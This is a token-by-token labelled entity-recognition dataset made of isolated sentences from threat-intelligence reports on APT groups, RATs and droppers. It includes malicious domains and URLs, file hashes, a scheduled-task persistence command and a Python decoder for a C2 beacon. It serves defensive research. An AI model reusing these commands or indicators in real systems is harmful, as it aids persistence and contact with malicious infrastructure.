The	O
below	O
screen	O
shot	O
shows	O
the	O
communication	O
to	O
the	O
C2	O
server	O
on	O
port	O
80	O
.	O

2016	O
.	O

일반적으로	O
에이전트는	O
전달된	O
명령이나	O
파일이	O
적합성이	O
확인된	O
것인지	O
검사하는	O
기능을	O
갖고	O
있다	O
.	O

Posted	O
on	O
:	O
January	O
24	O
,	O
2018	O
at	O
5:56	O
am	O
Posted	O
in	O
:	O
Malware	O
,	O
Targeted	O
Attacks	O

findstr	O
command	O
runs	O
as	O
follows	O
:	O
These	O
examples	O
show	O
detection	O
in	O
the	O
PHP	O
shell	O
.	O

This	O
function	O
is	O
at	O
the	O
core	O
of	O
the	O
RAT	B-malware.drop
's	O
network	O
communication	O
.	O

Many	O
of	O
the	O
DDNS	O
domains	O
were	O
concocted	O
to	O
mimic	O
legitimate	O
windows	O
update	O
domains	O
such	O
as	O
'	O
download.windowsupdate(.)com	B-url.unknown
'	O
,	O
'	O
ipv4.windowsupdate(.)com	B-url.unknown
'	O
,	O
and	O
'	O
v4.windowsupdate(.)com	B-url.unknown
'	O
.	O

The	O
macro	O
deletes	O
the	O
message	O
from	O
inbox	O
to	O
ensure	O
minimal	O
risk	O
of	O
exposure	O
.	O

Parsing	O
'	O
Sample	O
A	O
'	O
:	O

The	O
attackers	O
would	O
send	O
a	O
malicious	O
email	O
message	O
that	O
either	O
links	O
to	O
an	O
archive	O
file	O
(	O
RAR	O
or	O
ZIP	O
compressed	O
)	O
or	O
has	O
one	O
attached	O
to	O
it	O
.	O

The	O
malicious	O
samples	O
we	O
found	O
are	O
the	O
early	O
stage	O
malware	O
most	O
often	O
delivered	O
by	O
spear-phishing	O
e-mails	O
.	O

To	O
this	O
end	O
,	O
the	O
packets	O
have	O
the	O
same	O
packet	O
header	O
as	O
the	O
PCCFilePacketHeader	O
packet	O
header	O
.	O

This	O
exported	O
function	O
is	O
used	O
by	O
the	O
dropper	O
to	O
add	O
persistence	O
in	O
the	O
registry	O
and	O
to	O
drop	O
a	O
second	O
file	O
(	O
as	O
explained	O
in	O
our	O
previous	O
article	O
)	O
.	O

CrowdStrike	O
investigation	O
reveals	O
that	O
this	O
app	O
has	O
been	O
utilized	O
in	O
a	O
possible	O
training	O
or	O
operational	O
role	O
in	O
at	O
least	O
one	O
unit	O
of	O
the	O
Ukrainian	O
military	O
.	O

In	O
this	O
particular	O
case	O
,	O
the	O
perpetrators	O
likely	O
sought	O
out	O
openly	O
available	O
account	O
information	O
from	O
a	O
vKontakte	B-url.normal
page	O
belonging	O
to	O
a	O
Ukrainian	O
citizen	O
,	O
who	O
was	O
soliciting	O
donations	O
to	O
aid	O
volunteer	O
soldiers	O
fighting	O
in	O
eastern	O
Ukraine	O
.	O

Note	O
that	O
the	O
symbol	O
names	O
for	O
the	O
functions	O
were	O
made	O
by	O
us	O
during	O
the	O
analysis	O
.	O

The	O
core	O
payload	O
DLL	O
's	O
main	O
function	O
is	O
to	O
gather	O
system	O
information	O
,	O
execute	O
other	O
malware	O
in	O
the	O
form	O
of	O
plugins	O
,	O
and	O
update	O
itself	O
.	O

While	O
the	O
server	O
variant	O
binary	O
does	O
have	O
exports	O
related	O
to	O
the	O
standard	O
service	O
DLL	O
(	O
e.g.	O
ServiceMain	O
,	O
DllRegisterService	O
,	O
etc	O
.	O
)	O

HBGary	O
,	O
Inc	O
is	O
the	O
leading	O
provider	O
of	O
solutions	O
to	O
detect	O
,	O
diagnose	O
and	O
respond	O
to	O
advance	O
malware	O
threats	O
in	O
a	O
thorough	O
and	O
forensically	O
sound	O
manner	O
.	O

Both	O
VBS	O
 les	O
reference	O
the	O
same	O
 le	O
path	O
,	O
containing	O
the	O
same	O
misspelling	O
:	O
'	O
schtasks.exe	O
/create/	O
F	O
/sc	O
minute	O
/mo	O
2	O
/tn	O
'	O
UpdatMachine	O
'	O
/tr	O
%	O
LOCALAPPDATA%\microsoft\Feed\Y658123.vbs	B-malware.unknown
'	O
Are	O
the	O
two	O
groups	O
one	O
and	O
the	O
same	O
?	O

Other	O
recovery	O
techniques	O
are	O
certainly	O
viable	O
as	O
well	O
.	O

Table	O
1	O
.	O

It	O
is	O
easy	O
to	O
understand	O
that	O
if	O
key	O
or	O
value	O
members	O
are	O
larger	O
than	O
string	O
constant	O
pool	O
array	O
,	O
a	O
memory	O
corruption	O
problem	O
appears	O
.	O

from	O
Crypto.Cipher	O
import	O
ARC4	O
import	O
base64	O
,	O
binascii	O
,	O
string	O
def	O
customb64decode	O
(	O
s	O
)	O
:	O
newalphabet	O
=	O
'	O
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_	O
'	O
oldalphabet	O
=	O
string.uppercase	O
+	O
string.lowercase	O
+	O
string.digits	O
+	O
'	O
+/	O
'	O
s	O
=	O
s.translate	O
(	O
string.maketrans	O
(	O
newalphabet	O
,	O
oldalphabet	O
)	O
)	O
return	O
base64.b64decode	O
(	O
s	O
)	O
req	O
=	O
'	O
hvJZkcIvKKupNRlsqI0aN6jZDTYPz6ZS9Q-H5bCXiER37jqqCDzS3wIUulYOjyKHcDomZCD72mAc4fSCoHhJJ1UQliBkraMepzS5J3UUFUH-nofoOgVM02UlCs4LJANIuZH90vM5KH_Ih59DdVRbgQ==	O
'	O
unb64	O
=	O
customb64decode	O
(	O
req	O
)	O
rc4	O
=	O
ARC4.new	O
(	O
unb64	O
[	O
0:4	O
]	O
)	O
dec	O
=	O
rc4.decrypt	O
(	O
unb64	O
[	O
4	O
:	O
:	O
]	O
)	O
print	O
dec	O
Decoding	O
the	O
string	O
will	O
yield	O
the	O
following	O
:	O
k:9C18CDFE	O
s	O
:	O
masst	O
h	O
:	O
<	O
HOSTNAME	O
>	O
u	O
:	O
<	O
USERNAME	O
>	O
o:win32.5.1.2600.2.1.Service	O
Pack	O
3	O
m	O
:	O
<	O
MAC	O
ADDRESS	O
>	O

However	O
,	O
we	O
discovered	O
that	O
the	O
server	O
responds	O
always	O
with	O
403	O
Status	O
code	O
Forbidden	O
,	O
also	O
to	O
the	O
requests	O
sent	O
by	O
the	O
malware	O
itself	O
.	O

Targets	O
held	O
the	O
following	O
titles	O
:	O
National	O
political	O
director	O
Finance	O
director	O
Director	O
of	O
strategic	O
communications	O
Director	O
of	O
scheduling	O
Director	O
of	O
travel	O
Traveling	O
press	O
secretary	O
Travel	O
coordinator	O
Publicly	O
available	O
Bitly	O
data	O
reveals	O
how	O
many	O
of	O
the	O
short	O
links	O
were	O
clicked	O
,	O
likely	O
by	O
a	O
victim	O
opening	O
a	O
spearphishing	O
email	O
and	O
clicking	O
the	O
link	O
to	O
the	O
fake	O
Gmail	O
login	O
page	O
.	O

KIDA	O
also	O
has	O
an	O
IT	O
Consulting	O
Group	O
and	O
various	O
supporting	O
departments	O
.	O

VBR	O
stands	O
for	O
Volume	O
Boot	O
Record	O
,	O
and	O
is	O
made	O
up	O
of	O
the	O
boot	O
sector	O
and	O
bootstrap	O
code	O
.	O

This	O
is	O
likely	O
to	O
be	O
a	O
mechanism	O
that	O
the	O
threat	O
actors	O
implemented	O
in	O
order	O
to	O
handle	O
cases	O
in	O
which	O
they	O
would	O
have	O
to	O
go	O
through	O
infrastructure	O
changes	O
.	O

Figure	O
25	O
.	O

The	O
table	O
below	O
lists	O
examples	O
of	O
the	O
commands	O
and	O
outputs	O
for	O
ANEL	B-malware.backdoor
versions	O
5.1.1	O
rc	O
and	O
5.1.2	O
rc1	O
.	O

The	O
Department	O
of	O
Information	O
and	O
Communications	O
Technology	O
was	O
only	O
formed	O
in	O
2016	O
and	O
has	O
acknowledged	O
that	O
the	O
Philippines	O
'	O
state	O
of	O
cybersecurity	O
is	O
still	O
in	O
infancy	O
.	O

Previous	O
and	O
continuing	O
analysis	O
results	O
indicated	O
some	O
interesting	O
and/or	O
relevant	O
aspects	O
of	O
this	O
malware	O
:	O
The	O
malware	O
tries	O
to	O
be	O
quiet	O
-	O
error	O
handling	O
There	O
was	O
robust	O
implementation	O
intention	O
across	O
Windows	O
versions	O
The	O
malware	O
employs	O
robust	O
environment	O
checking	O
;	O
frustrating	O
inadvertent	O
execution	O
and	O
analysis	O
The	O
malware	O
prevents	O
multiple	O
iterations	O
of	O
itself	O
on	O
individual	O
systems	O
The	O
malware	O
does	O
not	O
run	O
on	O
systems	O
using	O
Gateways	O
assigned	O
a	O
particular	O
internal	O
net	O
range	O
(	O
10.x.x.x	B-ip.unknown
)	O
The	O
malware	O
's	O
execution	O
has	O
an	O
expiration	O
date	O
The	O
malware	O
purposely	O
obfuscates	O
and	O
complicates	O
C2	O
The	O
malware	O
injects	O
complexity	O
into	O
C2	O
encryption	O
operations	O
;	O
obfuscating	O
execution	O
and	O
frustrating/delaying	O
analysis	O
The	O
malware	O
uses	O
obscure	O
file	O
system	O
paths	O
The	O
malware	O
author	O
,	O
ironically	O
or	O
purposely	O
,	O
named	O
a	O
collected	O
data	O
storage	O
folder	O
'	O
Intel	O
'	O
The	O
following	O
interesting	O
questions/assumptions	O
emerged	O
from	O
previous	O
cursory	O
analysis	O
of	O
this	O
malware	O
:	O
C2	O
appears	O
to	O
be	O
accomplished	O
via	O
providing	O
commands	O
in	O
an	O
encrypted	O
file	O
stored	O
on	O
the	O
local	O
'	O
master	O
'	O
system	O
(	O
re	O
:	O
netsat.exe	O
)	O
.	O

We	O
have	O
mapped	O
out	O
the	O
links	O
between	O
known	O
drivers	O
whose	O
evolution	O
and	O
key	O
stages	O
of	O
development	O
are	O
easy	O
to	O
track	O
.	O

An	O
example	O
request	O
is	O
shown	O
below	O
:	O

The	O
idea	O
:	O
if	O
the	O
first	O
command	O
(	O
z1	O
)	O
is	O
missed	O
,	O
the	O
signature	O
still	O
catches	O
subsequent	O
commands	O
.	O

The	O
deliberate	O
containment	O
of	O
the	O
malware	O
to	O
targets	O
in	O
Iran	O
is	O
also	O
apparent	O
from	O
the	O
number	O
of	O
hosts	O
infected	O
worldwide	O
,	O
which	O
reached	O
only	O
around	O
100,000	O
with	O
approximately	O
60	O
%	O
being	O
in	O
Iran	O
.	O

At	O
location	O
A.	O
the	O
command	O
number	O
is	O
checked	O
.	O

A	O
Base64-encoded	O
string	O
containing	O
the	O
victim	O
's	O
full	O
email	O
address	O
is	O
passed	O
with	O
this	O
URL	O
,	O
prepopulating	O
a	O
fake	O
Google	O
login	O
page	O
displayed	O
to	O
the	O
victim	O
.	O

The	O
attackers	O
arsenal	O
consisted	O
of	O
modified	O
publicly-available	O
tools	O
as	O
well	O
as	O
six	O
undocumented	O
custom-built	O
tools	O
,	O
which	O
Cybereason	O
considers	O
the	O
threat	O
actor	O
's	O
signature	O
tools	O
.	O

An	O
example	O
C	O
&	O
C	O
beacon	O
is	O
seen	O
below	O
:	O

During	O
the	O
analysis	O
,	O
we	O
focused	O
on	O
the	O
similar	O
extensions	O
list	O
and	O
the	O
code	O
responsible	O
for	O
parsing	O
the	O
file	O
system	O
for	O
encryption	O
or	O
wiping	O
.	O

We	O
've	O
also	O
seen	O
another	O
version	O
(	O
{	O
BB7BDEC9-B59D-492E-A4AF-4C7B1C9E646B	O
}	O
.dll	O
)	O
,	O
which	O
executes	O
rastlsc.exe	O
with	O
the	O
parameter	O
krv	O
.	O

'	O
87bffb0370c9e14ed5d01d6cc0747cb30a544a71345ea68ef235320378f582ef.exe	O
'	O

For	O
example	O
,	O
it	O
can	O
provide	O
all	O
files	O
with	O
a	O
'	O
.doc	O
'	O
extension	O
,	O
the	O
size	O
of	O
which	O
is	O
bigger	O
than	O
10	O
kilobytes	O
,	O
and	O
that	O
were	O
modified	O
in	O
the	O
last	O
3	O
days	O
.	O

The	O
malware	O
also	O
adds	O
a	O
registry	O
key	O
to	O
make	O
it	O
persistent	O
across	O
reboots	O
:	O

Following	O
the	O
previous	O
report	O
,	O
this	O
individual	O
has	O
contacted	O
us	O
trying	O
to	O
learn	O
what	O
we	O
know	O
about	O
him	O
.	O

In	O
many	O
cases	O
,	O
their	O
ultimate	O
interest	O
is	O
the	O
Domain	O
Controller	O
.	O

Asruex	B-malware.drop
is	O
a	O
kind	O
of	O
malware	O
that	O
communicates	O
with	O
the	O
C	O
&	O
C	O
server	O
over	O
HTTP	O
,	O
and	O
executes	O
the	O
command	O
received	O
through	O
the	O
communication	O
.	O

The	O
icon	O
itself	O
is	O
a	O
meme	O
that	O
jokes	O
about	O
Ukrainians	O
(	O
http://s017.radikal.ru/i424/1609/83/0c3a23de7967.jpg	B-url.unknown
)	O
.	O

Updated	O
AF	O
MOD	O
contract	O
-	O
Jan	O
2018.exe	O

case	O
'	O
i	O
'	O
:	O

|	O
Administrator	O

Below	O
screen	O
shot	O
shows	O
the	O
file	O
(	O
officeupdate.exe	O
)	O
decoded	O
and	O
dropped	O
on	O
the	O
system	O
.	O

Meanwhile	O
,	O
runHandle	O
is	O
responsible	O
for	O
the	O
backdoor	O
capabilities	O
.	O

The	O
second	O
category	O
consists	O
of	O
PE	O
executable	O
files	O
that	O
CozyDuke	B-malware.drop
will	O
write	O
to	O
disk	O
and	O
execute	O
on	O
the	O
infected	O
host	O
.	O

During	O
the	O
faux	O
CHKDISK	O
scan	O
Diskcoder.C	O
actually	O
encrypts	O
the	O
data	O
.	O

Many	O
of	O
these	O
servers	O
were	O
shut	O
down	O
or	O
relocated	O
after	O
the	O
publication	O
of	O
previous	O
results	O
,	O
but	O
before	O
the	O
apparent	O
October	O
2012	O
update	O
.	O

SHA1	O
hash	O
:	O
8f81bb0bfa6b3ebf3ef4ea283b23a5ccae5b6817	B-hash

The	O
following	O
factors	O
show	O
the	O
level	O
of	O
sophistication	O
and	O
reveals	O
the	O
attackers	O
intention	O
to	O
remain	O
stealthy	O
and	O
to	O
gain	O
long-term	O
access	O
by	O
evading	O
anti-virus	O
,	O
sandbox	O
and	O
security	O
monitoring	O
at	O
both	O
the	O
desktop	O
and	O
network	O
levels	O
.	O

FLARE	O
found	O
the	O
samples	O
on	O
VirusTotal	O
while	O
researching	O
droppers	O
compiled	O
with	O
PyInstaller	O
—	O
an	O
approach	O
used	O
by	O
numerous	O
malicious	O
actors	O
.	O

The	O
existence	O
of	O
a	O
FinSpy	B-malware.backdoor
sample	O
that	O
contains	O
Ethiopia-specific	O
imagery	O
,	O
and	O
that	O
communicates	O
with	O
a	O
still-active	O
command	O
&	O
control	O
server	O
in	O
Ethiopia	O
strongly	O
suggests	O
that	O
the	O
Ethiopian	O
Government	O
is	O
using	O
FinSpy	B-malware.backdoor
.	O

Recent	O
samples	O
show	O
interest	O
in	O
Windows	O
2012	O
Server	O
and	O
Windows	O
8.1	O
.	O

The	O
PDF	O
on	O
the	O
left	O
is	O
the	O
non­malicious	O
version	O
,	O
while	O
the	O
one	O
on	O
the	O
right	O
is	O
malicious	O
.	O

Each	O
new	O
variant	O
included	O
new	O
features	O
.	O

From	O
the	O
C2	O
response	O
the	O
URL	O
is	O
extracted	O
starting	O
from	O
offset	O
14	O
(	O
i.e	O
15th	O
character	O
)	O
and	O
it	O
determines	O
the	O
length	O
of	O
the	O
string	O
(	O
URL	O
)	O
to	O
extract	O
by	O
finding	O
the	O
start	O
offset	O
of	O
the	O
string	O
'	O
clientpermission	O
'	O
once	O
it	O
finds	O
it	O
,	O
its	O
offset	O
value	O
is	O
subtracted	O
with	O
17	O
.	O

CyberX	O
's	O
Threat	O
Intelligence	O
Research	O
team	O
initially	O
discovered	O
Operation	O
BugDrop	O
malware	O
in	O
the	O
wild	O
.	O

Note	O
:	O
These	O
maps	O
do	O
not	O
provide	O
data	O
for	O
Crimea	O
.	O

Example	O
messages	O
include	O
Client	O
Start	O
!	O
,	O
indicating	O
a	O
successful	O
infection	O
,	O
or	O
an	O
error	O
message	O
such	O
as	O
[	O
2018-1-25	O
13:35:22	O
]	O
Try	O
All	O
Addr	O
Failed	O
!	O

'	O
@	O
AnonPress	O
Greetings	O
.	O

On	O
2016-11-08	O
we	O
observed	O
connections	O
to	O
the	O
site	O
referred	O
from	O
:	O

Figure	O
1.Character	O
and	O
Offset	O
Pairs	O
Found	O
in	O
Cmstar	O
Payload	O
and	O
the	O
Resulting	O
API	O
Function	O
Names	O
After	O
manually	O
creating	O
the	O
IAT	O
,	O
Cmstar	O
decrypts	O
its	O
configuration	O
,	O
several	O
encrypted	O
strings	O
,	O
and	O
a	O
piece	O
of	O
shellcode	O
.	O

At	O
USENIX	O
Security	O
2015	O
I	O
presented	O
a	O
paper	O
in	O
which	O
we	O
proposed	O
a	O
method	O
to	O
automatically	O
discover	O
malware	O
developments	O
from	O
samples	O
submitted	O
to	O
online	O
dynamic	O
analysis	O
systems	O
.	O

Figure	O
25	O
:	O
Fiddler	O
Web	O
debugger	O
decodes	O
the	O
Base64	O
traffic	O

For	O
at	O
least	O
the	O
past	O
decade	O
,	O
there	O
has	O
been	O
a	O
trend	O
towards	O
integrating	O
DCS	O
and	O
SIS	O
designs	O
for	O
various	O
reasons	O
including	O
lower	O
cost	O
,	O
ease	O
of	O
use	O
,	O
and	O
benefits	O
achieved	O
from	O
exchanging	O
information	O
between	O
the	O
DCS	O
and	O
SIS	O
.	O

This	O
probably	O
was	O
done	O
to	O
evade	O
detection	O
,	O
as	O
many	O
host-based	O
and	O
network-based	O
AV	O
engines	O
do	O
not	O
have	O
the	O
ability	O
to	O
scan	O
large	O
files	O
.	O

New	O
version	O
of	O
mobile	O
malware	O
Catelites	O
possibly	O
linked	O
to	O
Cron	O
cyber	O
gang	O

In	O
addition	O
to	O
that	O
,	O
files	O
that	O
are	O
larger	O
than	O
1MB	O
after	O
encryption	O
do	O
not	O
contain	O
padding	O
,	O
so	O
there	O
is	O
no	O
way	O
to	O
verify	O
the	O
key	O
.	O

This	O
file	O
will	O
also	O
use	O
a	O
name	O
specified	O
in	O
the	O
droppers	O
configuration	O
file	O
.	O

The	O
gap	O
matches	O
the	O
absence	O
of	O
samples	O
during	O
two	O
years	O
and	O
this	O
fundamental	O
modification	O
is	O
what	O
we	O
call	O
the	O
death	O
of	O
Agent.BTZ	B-malware.backdoor
and	O
the	O
birth	O
of	O
ComRAT	B-malware.backdoor
.	O

Samples	O
#	O
7-9	O
are	O
older	O
versions	O
of	O
the	O
Hermes	B-malware.ransom
ransomware	O
.	O

@	O
@	O
notmyser	O
ferry	O
1	O
@	O
@	O
d81596a9	O

*	O
[	O
ROOT_DRIVE	O
]	O
:	O
\Users\Administrator\AppData\Local\Allians\mcs\nfzp	O
[	O
ROOT_DRIVE	O
]	O
:	O
\Users\Administrator\AppData\Local\Allians\mcs\nfzf	O
[	O
ROOT_DRIVE	O
]	O
:	O
\Users\Administrator\AppData\Local\Allians\mcs\fofp	O
[	O
ROOT_DRIVE	O
]	O
:	O
\Users\Administrator\AppData\Local\Allians\mcs\foff	O

In	O
some	O
cases	O
we	O
have	O
been	O
able	O
to	O
watch	O
developers	O
update	O
and	O
test	O
variants	O
of	O
the	O
framework	O
,	O
and	O
even	O
come	O
across	O
server-side	O
code	O
being	O
tested	O
by	O
budding	O
hackers	O
.	O

In	O
any	O
case	O
,	O
Cylance	O
hopes	O
to	O
better	O
equip	O
defenders	O
to	O
detect	O
and	O
respond	O
to	O
active	O
threats	O
within	O
their	O
network	O
and	O
enable	O
the	O
broader	O
security	O
community	O
to	O
respond	O
to	O
similar	O
threats	O
.	O

The	O
focus	O
of	O
the	O
analysis	O
then	O
shifted	O
to	O
Sample	O
B	O
.	O

Network	O
Protection	O
Products	O

APT32	B-malware.infosteal
actors	O
designed	O
multilingual	O
lure	O
documents	O
which	O
were	O
tailored	O
to	O
specific	O
victims	O
.	O

Data	O
to	O
be	O
transmitted	O
.	O

Analysis	O
of	O
the	O
file	O
with	O
MD5	O
Hash	O
:	O
D9821468315CCD3B9EA03161566EF18E	B-hash

Its	O
name	O
is	O
derived	O
from	O
its	O
behavior	O
of	O
grabbing	O
audio	O
,	O
video	O
,	O
and	O
screenshots	O
from	O
affected	O
machines	O
.	O

A	O
comprehensive	O
security	O
strategy	O
that	O
involves	O
proactive	O
incident	O
response	O
will	O
need	O
the	O
input	O
of	O
both	O
decision	O
makers	O
and	O
tech-savvy	O
personnel	O
,	O
as	O
they	O
will	O
need	O
to	O
be	O
on	O
the	O
same	O
page	O
for	O
it	O
to	O
be	O
effective	O
.	O

Dobb	O
's	O
Journal	O
,	O
on	O
the	O
cover	O
of	O
the	O
Linux	O
Journal	O
,	O
and	O
the	O
Fox	O
sitcom	O
Breaking	O
In	O
.	O

Regards	O
Milker	O
Trading	O
Ltd	O
Auggenthal	O
1	O
94140	O
Ering	O
Mexico	O
.	O

Ultimately	O
,	O
this	O
means	O
that	O
the	O
malicious	O
code	O
is	O
invisible	O
to	O
the	O
user	O
of	O
the	O
app	O
,	O
and	O
can	O
be	O
easily	O
reused	O
alongside	O
any	O
real	O
application	O
.	O

'	O
All	O
Signs	O
Point	O
to	O
Russia	O
Being	O
Behind	O
the	O
DNC	O
Hack	O
.	O
'	O

Here	O
is	O
the	O
data	O
structure	O
used	O
to	O
keep	O
track	O
of	O
the	O
plugins	O
:	O

Although	O
capable	O
of	O
executing	O
many	O
functions	O
,	O
only	O
the	O
following	O
were	O
widely	O
utilized	O
in	O
the	O
attack	O
:	O

19	O
,	O
2018	O
,	O
2:56	O
p.m.	O
)	O
:	O
2018:01:19	O
14:56:00	O
(	O
JAn	O
.	O

Fake	O
'	O
Adobe	O
Flash	O
Player	O
'	O
Epic	B-malware.backdoor
backdoor	O
installers	O
:	O

공급망	O
(	O
Supply	B-malware.drop
Chain	I-malware.drop
)	O
공격	O
.................................................................................................................................	O
10	O
주요	O
공격	O
사례	O
...................................................................................................................................................................	O
10	O
주요	O
악성코드	O
및	O
공격	O
도구	O
분석	O
............................................................................................................................	O
13	O
1	O
.	O

One	O
of	O
the	O
four	O
PE	O
files	O
in	O
the	O
IOCs	O
section	O
was	O
sent	O
from	O
Pakistan	O
,	O
too	O
.	O

View	O
our	O
Privacy	O
Policy	O
here	O
.	O

What	O
is	O
interesting	O
is	O
the	O
potential	O
overlap	O
between	O
the	O
target	O
selection	O
of	O
this	O
cluster	O
and	O
the	O
targets	O
of	O
those	O
behind	O
the	O
recently	O
reported	O
Forbes	O
compromise.Checking	O
the	O
Google	O
SafeBrowsing	O
results	O
for	O
*.googlecaches.com	B-url.unknown
,	O
shows	O
that	O
the	O
domain	O
was	O
used	O
for	O
distribution	O
of	O
malicious	O
code	O
for	O
a	O
significant	O
period	O
after	O
our	O
previous	O
blog	O
entry	O
:	O
This	O
includes	O
distribution	O
via	O
gokbayrak.com	B-url.unknown
.	O

The	O
only	O
script	O
inside	O
the	O
bb28	O
directory	O
though	O
appears	O
to	O
be	O
interesting	O
.	O

The	O
threat	O
group	O
used	O
a	O
variety	O
of	O
attack	O
tools	O
and	O
techniques	O
to	O
spy	O
on	O
their	O
target	O
organizations	O
.	O

However	O
,	O
like	O
in	O
the	O
USENIX	O
publication	O
,	O
in	O
this	O
post	O
we	O
will	O
make	O
no	O
speculation	O
about	O
attribution	O
.	O

Some	O
may	O
never	O
return	O
using	O
the	O
same	O
tools	O
and	O
techniques	O
.	O

공격자는	O
다양한	O
방법으로	O
기업과	O
기관의	O
내부로	O
침투를	O
시도하고	O
있다	O
.	O

.	O

APT28	B-malware.infosteal
espionage	O
activity	O
has	O
primarily	O
targeted	O
entities	O
in	O
the	O
U.S.	O
,	O
Europe	O
,	O
and	O
the	O
countries	O
of	O
the	O
former	O
Soviet	O
Union	O
,	O
including	O
governments	O
and	O
militaries	O
,	O
defense	O
attaches	O
,	O
media	O
entities	O
,	O
and	O
dissidents	O
and	O
figures	O
opposed	O
to	O
the	O
current	O
Russian	O
Government	O
.	O

Before	O
installation	O
of	O
the	O
main	O
communication	O
component	O
,	O
the	O
dropper	O
takes	O
several	O
actions	O
on	O
the	O
infected	O
system	O
:	O
it	O
will	O
fi	O
rst	O
call	O
the	O
GetInputState	O
(	O
)	O
function	O
that	O
verifi	O
es	O
if	O
there	O
are	O
mouse	O
or	O
keyboard	O
messages	O
in	O
the	O
calling	O
thread	O
's	O
queue	O
being	O
followed	O
by	O
calls	O
to	O
PostThreadMessage	O
(	O
)	O
and	O
GetMessage	O
(	O
)	O
.	O

Over	O
the	O
last	O
two	O
days	O
,	O
Volexity	B-malware.backdoor
has	O
observed	O
malicious	O
code	O
being	O
served	O
up	O
from	O
the	O
website	O
of	O
the	O
Alliance	O
for	O
True	O
Democracy	O
(	O
ATD	O
)	O
in	O
Hong	O
Kong	O
(	O
www.atd.hk	B-url.unknown
)	O
.	O

http://www.microsoft.com/technet/security/advisory/979352.mspx	B-url.unknown
Below	O
we	O
have	O
a	O
summary	O
of	O
McAfee	O
's	O
assessment	O
of	O
Internet	O
Explorer	O
and	O
platform	O
risks	O
:	O
*	O
DEP	O
Data	O
Execution	O
Prevention	O
(	O
DEP	O
)	O
is	O
a	O
set	O
of	O
hardware	O
and	O
software	O
technologies	O
that	O
perform	O
additional	O
checks	O
on	O
memory	O
to	O
help	O
prevent	O
malicious	O
code	O
from	O
running	O
on	O
a	O
system	O
.	O

The	O
attackers	O
appear	O
to	O
be	O
casting	O
a	O
wide	O
net	O
with	O
this	O
campaign	O
.	O

We	O
ended	O
up	O
having	O
to	O
edit	O
the	O
image	O
by	O
adding	O
the	O
backup	O
boot	O
sectors	O
into	O
the	O
correct	O
sector	O
where	O
the	O
originals	O
were	O
found	O
.	O

Instead	O
of	O
the	O
programming	O
languages	O
most	O
commonly	O
used	O
for	O
malware	O
creation	O
,	O
the	O
actors	O
have	O
turned	O
to	O
using	O
Python	O
,	O
a	O
powerful	O
scripting	O
language	O
.	O

Comparison	O
of	O
the	O
infection	O
chains	O
used	O
in	O
the	O
previous	O
and	O
current	O
campaigns	O

A	O
second	O
type	O
of	O
an	O
obfuscated	O
PowerShell	O
payload	O
consisted	O
of	O
Cobalt	O
Strike	O
's	O
Beacon	O
payload	O
:	O

The	O
dropper	O
installs	O
the	O
backdoor	O
,	O
sets	O
its	O
attributes	O
to	O
'	O
hidden	O
'	O
,	O
and	O
sets	O
a	O
random	O
file	O
date	O
and	O
time	O

APT28	O
group	O
(	O
aka	O
Fancy	O
Bear	O
,	O
Pawn	O
and	O
Strontium	O
)	O
has	O
been	O
active	O
since	O
at	O
targeted	O
governments	O
,	O
militaries	O
,	O
and	O
security	O
organizations	O
worldwide	O
.	O

BRIEF	O
DISCUSSION	O
OF	O
FINDINGS	O

There	O
is	O
for	O
example	O
a	O
domain	O
natco5.no-ip.net	B-url.cncsvr
which	O
resolves	O
to	O
the	O
same	O
IP	O
's	O
as	O
the	O
rest	O
of	O
the	O
series	O
,	O
but	O
we	O
have	O
not	O
seen	O
the	O
malware	O
which	O
uses	O
it	O
–	O
yet	O
.	O

The	O
raw	O
data	O
is	O
then	O
decrypted	O
using	O
the	O
preliminary	O
crypto	O
key	O
.	O

CVE-2014-0497	O
–	O
A	O
0-day	O
Vulnerability	O
https://securelist.com/blog/incidents/58244/cve-2014-0497-a-0-day-vulnerability/	B-url.normal
Hacking	O
Team	O
Flash	O
Zero-Day	O
Tied	O
To	O
Attacks	O
In	O
Korea	O
and	O
Japan	O
...	O
on	O
July	O
1	O
http://blog.trendmicro.com/trendlabs-security-intelligence/hacking-team-flash-zero-day-tied-to-attacks-in-korea-and-japan-on-july-1/	B-url.normal
The	O
Darkhotel	B-malware.infosteal
APT	I-malware.infosteal
https://securelist.com/blog/research/66779/the-darkhotel-apt/	B-url.normal

The	O
attackers	O
upload	O
data	O
to	O
the	O
account	O
,	O
which	O
is	O
downloaded	O
by	O
the	O
implant	O
,	O
decrypted	O
and	O
interpreted	O
.	O

Upon	O
successful	O
exploitation	O
of	O
Internet	O
Explorer	O
,	O
the	O
shellcode	O
will	O
download	O
an	O
obfuscated	O
second	O
stage	O
executable	O
from	O
http://demo1.ftpaccess.cc/demo/ad.jpg	B-url.unknown
which	O
is	O
the	O
dropper	O
.	O

function	O
.	O
)	O

20	O
June	O
2016	O
.	O

The	O
payload	O
is	O
consequently	O
moved	O
to	O
\AppData\Roaming\Microsoft\Windows\Caches\	O
as	O
a	O
file	O
named	O
NavShExt.dll	O
and	O
the	O
executable	O
a.b	O
is	O
deleted	O
.	O

Enterprise-level	O
business	O
cooperation	O
After	O
the	O
Deadline	O
Feedback	O
Army	O
Cobalt	O
Strike	O
Open	O
source	O
software	O
Armitage	O
Far	O
East	O
jIRCii	O
Moconti	O
One	O
Hand	O
Army	O
Man	O
s	O
phPERL	O
Same	O
Game	O
Sleep	O

These	O
signs	O
add	O
to	O
the	O
pretty	O
long	O
list	O
of	O
indicators	O
already	O
supporting	O
this	O
hypothesis	O
,	O
in	O
particular	O
the	O
ones	O
mentioned	O
by	O
Canada	O
's	O
CSE	O
.	O

netname	O
inetnum_start	O
inetnum_end	O
country	O
mnt-by	O
created	O

These	O
actions	O
demonstrate	O
a	O
well-resourced	O
adversary	O
with	O
a	O
thorough	O
implant-testing	O
regime	O
that	O
is	O
highly	O
attuned	O
to	O
slight	O
configuration	O
issues	O
that	O
may	O
result	O
in	O
their	O
detection	O
,	O
and	O
which	O
would	O
cause	O
them	O
to	O
deploy	O
a	O
different	O
tool	O
instead	O
.	O

Before	O
rebuilding	O
the	O
MBR	O
try	O
adding	O
the	O
image	O
as	O
a	O
volume	O
and	O
not	O
as	O
a	O
disk	O
.	O

I	O
received	O
a	O
connection	O
attempt	O
from	O
the	O
victim	O
and	O
a	O
response	O
from	O
the	O
controller	O
returned	O
the	O
correct	O
packet	O
flag	O
.	O

The	O
campaigns	O
maintain	O
separate	O
back-end	O
command	O
and	O
control	O
infrastructures	O
hosted	O
in	O
different	O
provinces	O
in	O
Mainland	O
China	O
.	O

This	O
is	O
an	O
archive	O
with	O
a	O
password	O
